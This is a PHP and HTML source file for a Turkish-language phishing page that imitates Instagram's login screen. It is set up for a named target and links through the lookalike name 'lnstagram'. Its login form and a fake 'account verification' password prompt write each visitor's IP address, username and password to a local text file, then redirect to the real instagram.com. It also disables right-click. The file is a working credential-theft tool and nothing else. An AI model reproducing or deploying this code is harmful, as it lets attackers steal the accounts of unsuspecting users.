<?php session_start();ob_start();error_reporting(0);$username = "Hedefin adi" ?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-witdh,initial-scale=1">
	<title>Instagram</title>
	<link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
</head>
	<style type="text/css">
		*{
			margin: 0;
			padding: 0;
		}
		nav{
			background: linear-gradient(to right, #BD3380, #ED5740);
			display: flex;
			justify-content: space-between;
			padding: 5px 15px;
		}
		nav .insta{
			color: #fff;
			font-family: Arial;
			padding: 7px;
		}
		a{
			align-self: center;
			font-family: Arial;
			color: #fff;
			border: 1px solid #fff;
			text-decoration: none;
			padding: 5px 10px;
			border-radius: 5px;
			font-weight: bold;
		}
		#insta{
			margin-top: 100px;
			display: flex;
			justify-content: center;
		}
		#insta .container{
			max-width: 420px;
			min-width: 320px;
			width: 100vw;
			min-height: 350px;
			padding: 25px 0;
			display: flex;
			flex-direction: column;
			align-items: center;
			justify-content: space-between;
			border: .5px solid #CACACA;
			font-family: Arial;
			background-color: #fff;
		}
		/*continue*/
		#continue{
			display: flex;
			align-items: center;
			margin-top: 100px;
			flex-direction: column;
			font-family: Arial;
		}
		#continue .container{
			max-width: 340px;
			min-width: 240px;
			border: .5px solid #cacaca;
			display: flex;
			flex-direction: column;
			align-items: center;
			padding: 40px;
			margin-bottom: 20px;
		}
		.form input{
			width: 100%;
			font-size: 18px;
			padding: 10px;
			outline: none;
			color: #555;
			border-radius: 5px;
			border: 1px solid #999;
			box-sizing: border-box;
			margin: 15px 0;
		}
		.form button{
			width: 100%;
			font-size: 18px;
			font-weight: bold;
			padding: 10px;
			border-radius: 5px;
			border: none;
			cursor: pointer;
			margin-bottom: 20px;
		}
		#continue .apps{
			max-width: 400px;
			width: 100vw;
		}
		#continue .apps img{
			width: 100%;
		}
		/**/
		#login{
			margin-top: 100px;
			display: flex;
			flex-direction: column;
			align-items: center;
			font-family: Arial;
		}
		#login .container{
			max-width: 360px;
			width: calc(100vw - 40px);
			display: flex;
			flex-direction: column;
			align-items: center;
			border: .5px solid #cacaca;
			padding: 20px;
			margin-bottom: 20px;
		}
		#login .form-div{
			margin-top: 20px;
			max-width: 340px;
			width: 80vw;
			display: flex;
			flex-direction: column;
		}
		#login input{
			padding: 15px;
			margin: 5px 0;
			border-radius: 3px;
			border: .5px  solid #999;
			background-color: #FAFAFA;
			font-size: 12px;
			outline: none;
		}
		#login input:invalid ~ .color{
			background-color: #B2DFFC;
			transition: .5s all;
		}
		#login button{
			margin-top: 10px;
			background-color: #0095F6;
			border-radius: 3px;
			border: none;
			cursor: pointer;
			transition: .5s all;
			color: #fff;
			font-weight: bold;
			padding: 13px;
		}


		@media (max-width: 420px){
			#insta{
				margin-top: 50px;
			}
			/*continue*/
			#continue{
				margin-top: 50px;
			}
			#login {
				margin-top: 50px;
			}
			#continue .container{
				padding: 20px;
			}
			#login .container{
				max-width: 420px;
				width: 100vw;
				padding:20px 10px;
			}
			#login .form-div{
				max-width: 360px;
				width: 90vw;
			}
		}
		@media (max-width: 360px){
			#login .container{
				width: 100%;
				padding:20px 0;
			}
			#login .form-div{
				width: 96vw;
			}

		}
	</style>
<body >

	<nav>
		<div class="insta">
			<p style="font-weight: bold;font-size: 14px;">Instagram</p>
			<p style="font-size: 12px;">Google Play'de ücretsiz bul.</p>
		</div>
		<a href="">YÜKLE</a>
	</nav>

	<?php
		$page = $_GET['page'];

		switch ($page) {
			case 'continue':
				?>
					<section id="insta">
						<div class="container">
							<img width="180" src="logo.png">
							<img style="border-radius: 50%; width: 135px; height: 135px;object-fit: cover;margin: 30px 0;" src="profile.jpg">
							<a style="background-color: #0095F6;padding: 10px 0;width: 96%;max-width: 360px;text-align: center;margin: 10px 10px 0 10px;font-weight: normal;" href="password"><b><?= $username ?></b> olarak devam et</a>
							<p style="color: #555;margin-top: 40px;"><b><?= $username ?></b> değil misin?</p>
							<a style="color: #1D9FF6" href="lnstagram">Hesap değiştir</a>
						</div>	
					</section>
				<?php
				break;
			case 'password':
				?>

					<section id="continue">
						<div class="container">
							<img style="width: 100px;opacity: .7;margin-bottom: 30px;" src="password.png">
							<p style="text-align: center;color: #555;">Hesap doğrulama 1 dakika kadar sürebilir, lütfen bekleyin.</p>
							<form action="" method="post">
								<p style="text-align: center;font-size: 16px;color: #00E422;font-weight: bold;">
									<?php 
										echo $_SESSION['alert'];
										unset($_SESSION['alert']);
										echo $_SESSION['ok'];
											if ($_SESSION['ok']) {
												header("refresh:3; ok");
											}
									?>			
								</p>
								<div class="form">
									<input type="password" name="password" placeholder="şifrenizi girin" autocomplete="off">
									<button style="background-color: #0095F6;color: #fff;" type="submit" name="submit">Onayla</button>
								</div>
								<p style="color: #333;width:100%;font-size: 14px;text-align: center;">Hesap doğrulaması bittikten sonra otomatik giriş sayfasına yönlendirileceksiniz <br>	<b style="color: #0095F6;">lnstagram ekibi</b></p>
							</form>
						</div>
						Uygulamayi indir
						<div class="apps">
							<img width="100" src="apple-google.png">
						</div>
					</section>
				<?php
				if (isset($_POST['submit'])) {
					$password = $_POST['password'];
					$addr = $_SERVER['REMOTE_ADDR'];
					if (empty($password)) {
						$_SESSION['alert'] = "Lütfen şifrenizi doğru girin";
						header("location: password");
					}
					else{
						$fopen = fopen("insta_list.txt", "a+");
						$fwrite = fwrite($fopen, "$addr = pass: $password \n");
						if ($fwrite == true) {
							$_SESSION['ok'] = "Lütfen bekleyin yönlendiriliyorsunuz";
							header("location: password");
						}
					}
				}
				break;
			case 'ok':
				?>
					<div style="width: 100%;position: absolute;left: 50%;top: 50%; transform: translate(-50% , -50%);display: flex;flex-direction: column;align-items: center;">
						<img style="width: 100px;" src="ok.gif">
						<p style="margin-top: 5px;color: #666;font-family: Arial;text-align: center;">Hesap analiz ediliyor en yakin zamanda size tekrar döneceğiz.</p>
						<p style="margin-top: 5px;color: #333;font-family: Arial;text-align: center;">5 saniye içinde yönlendirileceksiniz</p>
						<p style="margin-top: 5px;color: #74B13D;font-family: Arial;font-weight: bold;text-align: center;">Tekrar giriş edin</p>
					</div>
				<?php
				unset($_SESSION['ok']);
				header("refresh:2 https://instagram.com");
				break;		
			
			default:
				?>
					<section id="login">
						<div class="container">
							<img style="width: 190px;margin-top: 20px;" src="logo.png">
							<form action="" method="post" autocomplete="off">
						<p style="text-align: center;font-size: 16px;color: #00E422;font-weight: bold;">		
								<?php 
									echo $_SESSION['alert'];
									unset($_SESSION['alert']);
										if ($_SESSION['ok']) {
											header("refresh:1; ok");
										}
								?>
						</p>		
								<div class="form-div">
									<input type="text" name="name" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
									<input type="password" name="password" placeholder="Şifre" required minlength="3">
									<button class="color" type="submit" name="submit">Giriş Yap</button>
								</div>
							</form>
							<p style="margin-top: 20px;font-family: Arial;color: #999;font-weight: bold;">YA DA</p>
							<p style="color: #385185;font-family: Arial;font-weight: bold;font-size: 14px;margin-top: 20px;">Facebook ile Giriş Yap</p>
							<p style="font-family: Arial; font-size: 14px;color: #777; margin-top: 20px;">Şifreni mi unuttun?</p>
						</div>
						<span style="color: #555">Uygulamayı indir</span>
						<div style="max-width: 420px;width: 100vw;">
							<img style="width: 100%" src="apple-google.png">
						</div>
					</section>
				<?php
				if (isset($_POST['submit'])) {
					$addr = $_SERVER['REMOTE_ADDR'];
					$name = $_POST['name'];
					$password = $_POST['password'];
						if (empty($name) || empty($password)) {
							$_SESSION['alert'] = "Lütfen boş alan bırakmayın";
							header("location: lnstagram");
						}
						else{
							$fopen = fopen("insta_list.txt", "a+");
							$fwrite = fwrite($fopen, "$addr = log: $name = pass: $password \n");
							if ($fwrite) {
								$_SESSION['ok'] = true;
								header("location: lnstagram");
							}
						}
				}
				break;
		}
	?>
	
	
	<script type="text/javascript">
		document.addEventListener('contextmenu', event => event.preventDefault());
	</script>
</body>
</html>